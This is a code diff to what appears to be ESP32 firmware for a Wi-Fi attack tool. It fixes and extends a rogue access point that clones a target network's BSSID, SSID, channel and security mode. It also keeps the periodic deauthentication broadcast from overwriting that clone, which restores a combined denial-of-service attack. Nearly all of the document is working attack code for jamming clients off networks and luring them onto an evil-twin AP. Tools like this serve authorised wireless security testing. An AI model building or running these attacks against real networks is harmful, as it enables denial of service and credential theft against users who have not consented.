@@ -26,6 +26,16 @@ static const char *TAG = "main:attack_method";
 static esp_timer_handle_t deauth_timer_handle = NULL;
 
 /**
+ * @brief True while the AP interface is configured as a clone of the target AP.
+ *
+ * A running rogue AP already owns the radio channel, so the broadcast helper
+ * must not reconfigure the AP interface back to the management AP: that would
+ * silently replace the clone with the management AP (and is what made the
+ * "combine all" DoS method lose its rogue-AP half).
+ */
+static bool rogue_ap_active = false;
+
+/**
  * @brief Callback for periodic deauthentication frame timer
  * 
  * Periodicaly called to send deauthentication frame for given AP
@@ -53,10 +63,14 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
            the management AP here would restart the AP and break the capture,
            so only nudge the channel. */
         wifictl_set_channel(ap_record->primary);
+    } else if (rogue_ap_active) {
+        /* The rogue AP owns the channel and the AP interface; reconfiguring it
+           here would overwrite the clone with the management AP. */
+        wifictl_set_channel(ap_record->primary);
     } else {
-        /* No sniffer: in APSTA mode the management AP owns the channel and a
-           plain esp_wifi_set_channel() is undone by the running AP, so the AP
-           has to be reconfigured to actually move the radio. */
+        /* No sniffer and no rogue AP: in APSTA mode the management AP owns the
+           channel and a plain esp_wifi_set_channel() is undone by the running
+           AP, so the AP has to be reconfigured to actually move the radio. */
         wifictl_move_mgmt_ap_to_channel(ap_record->primary);
     }
     const esp_timer_create_args_t deauth_timer_args = {
@@ -93,6 +107,10 @@ void attack_method_broadcast_stop(){
  * @param ap_record target AP that will be cloned/duplicated
  */
 void attack_method_rogueap(const wifi_ap_record_t *ap_record){
+    if (ap_record == NULL || ap_record->primary == 0) {
+        ESP_LOGE(TAG, "Cannot start a rogue AP without a valid AP record");
+        return;
+    }
     ESP_LOGD(TAG, "Configuring Rogue AP");
     wifictl_set_ap_mac(ap_record->bssid);
     wifi_config_t ap_config = {
@@ -100,10 +118,32 @@ void attack_method_rogueap(const wifi_ap_record_t *ap_record){
             .ssid_len = strlen((char *)ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
-            .password = "dummypassword",
             .max_connection = 1
         },
     };
-    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    /* An open clone must not carry a password, and ESP-IDF rejects a
+       WPA2/WPA3 config whose password is shorter than 8 characters. */
+    if (ap_config.ap.authmode != WIFI_AUTH_OPEN) {
+        strncpy((char *) ap_config.ap.password, "dummypassword",
+                sizeof(ap_config.ap.password) - 1);
+    }
+    mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
     wifictl_ap_start(&ap_config);
+    rogue_ap_active = true;
+}
+
+bool attack_method_rogueap_active(void){
+    return rogue_ap_active;
+}
+
+/**
+ * @brief Stops the rogue AP and brings the management AP back.
+ *
+ * Safe to call when no rogue AP is running.
+ */
+void attack_method_rogueap_stop(void){
+    if (!rogue_ap_active) return;
+    wifictl_mgmt_ap_start();
+    wifictl_restore_ap_mac();
+    rogue_ap_active = false;
 }
